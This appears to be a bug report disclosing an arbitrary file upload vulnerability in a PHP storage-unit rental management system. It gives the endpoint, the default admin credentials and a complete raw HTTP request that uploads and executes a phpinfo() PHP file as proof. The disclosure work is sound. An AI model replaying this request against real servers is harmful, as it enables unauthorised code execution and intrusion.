# Storage Unit Rental Management System v1.0 has arbitrary file upload

BUG_Author: bit3hh

Website source address:https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html

Vulnerability url: /storage/classes/Users.php?f=save

post form-data parameter 'filename' exists arbitrary file upload

##### Steps to reproduce

1.Go to the admin Dashboard

http://localhost/storage/admin/login.php

Default Admin Access Information

Username: admin / Password: admin123

2.Click on User List and Click on +Create New

![image](https://github.com/ret2hh/bug_report/blob/main/upload1.png)

3.Any file can be uploaded, such as uploading php code

```
POST /storage/classes/Users.php?f=save HTTP/1.1
Host: localhost
Content-Length: 782
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWEK02qqTsnNh5aIU
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/storage/admin/?page=user/manage_user
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=31osi92l18vkna98judnbogmkg
Connection: close

------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="firstname"

a
------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="lastname"

b
------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="username"

c
------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="password"

d
------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="type"

1
------WebKitFormBoundaryWEK02qqTsnNh5aIU
Content-Disposition: form-data; name="img"; filename="info.php"
Content-Type: application/octet-stream

<?php
phpinfo();
?>
------WebKitFormBoundaryWEK02qqTsnNh5aIU--
```

4.Access to uploaded files can be executed successfully

![image](https://github.com/ret2hh/bug_report/blob/main/upload2.png)
